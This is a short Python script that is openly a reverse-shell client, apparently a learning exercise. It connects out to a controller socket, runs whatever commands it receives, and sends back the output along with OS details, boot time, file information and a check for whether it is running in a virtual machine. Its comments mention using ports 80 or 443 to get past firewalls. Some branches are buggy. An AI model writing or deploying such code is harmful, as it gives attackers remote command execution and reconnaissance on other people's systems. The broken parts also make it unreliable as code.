#!/usr/bin/env python3


#use hostnamectl to find out if it is a VM
#use finger to find user activity/idle time...


from datetime import datetime
import os
import psutil
import socket
import subprocess
import sys



serverIP = socket.gethostbyname(socket.gethostname())
serverPort = 8016 #usually, malicious reverse shells use popular ports like 80 (http) or 443(https) to bypass firewall
bufferLen = 1024 * 64 # 64kb max size of messages.
space = "\n" #separator string for sending 2 messages in one line
address=(serverIP,serverPort)

clientSocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
clientSocket.connect(address)


def bootTime():
	header = "~"*5 + "Boot Time" + "~"*5 + "\n"
	bootTimeTimeStamp = psutil.boot_time()
	bootTimeFinal = datetime.fromtimestamp(bootTimeTimeStamp)
	#x = ("y",bootTimeFinal.year,bootTimeFinal.month,bootTimeFinal.day)
	x=f"{header}{bootTimeFinal.year}/{bootTimeFinal.month}/{bootTimeFinal.day} {bootTimeFinal.hour}:{bootTimeFinal.minute}:{bootTimeFinal.second}"
	return x


def OSinfo():
	header = "\n" + "~"*5 + "Operating system information" + "~"*5 + "\n"
	operatingSystem = "\n" + os.uname()[0] + "\n"
	networkName = os.uname()[1] + "\n"
	osRelease = os.uname()[2] + "\n"
	osVersion = os.uname()[3] + "\n"
	hardwareID = os.uname()[4] + "\n"
	sysinfo = f"{header}{operatingSystem}{networkName}{osRelease}{osVersion}{hardwareID}"
	return sysinfo

def checkVirtualMachine():
	output = subprocess.run("cat /sys/class/dmi/id/product_name",stdout=subprocess.PIPE,shell=True,text=True)
	if "VM" in output.stdout:
		r=1
	else:
		r=0
	return r



while True:
	command=clientSocket.recv(bufferLen).decode()

	if command.lower() == "exit":
		break

	elif command.lower() == "sysinfo":
		output = OSinfo()
		message = f"{output}{space}"

	elif command.lower() == "boottime":
		output = bootTime()
		message=f"{output}{space}"

	elif command.lower() == "checkvirtualmachine":
		if checkVirtualMachine() == 1:
			output="This is a virtual machine."
			message=f"{output}{space}"
		else :
			output="This is not a virtual machine."
			message=f"{output}{space}"

	elif command.lower() == "haha.txt":
		file_name = "haha.txt"
		file_size = os.path.getsize(file_name)
		clientSocket.send(f"{file_name}{space}{file_size}")


	else:
		output = subprocess.run(command, stdout=subprocess.PIPE, text=True)
		message = f"{output.stdout}{space}{space}"
	clientSocket.send(message.encode())





clientSocket.close()


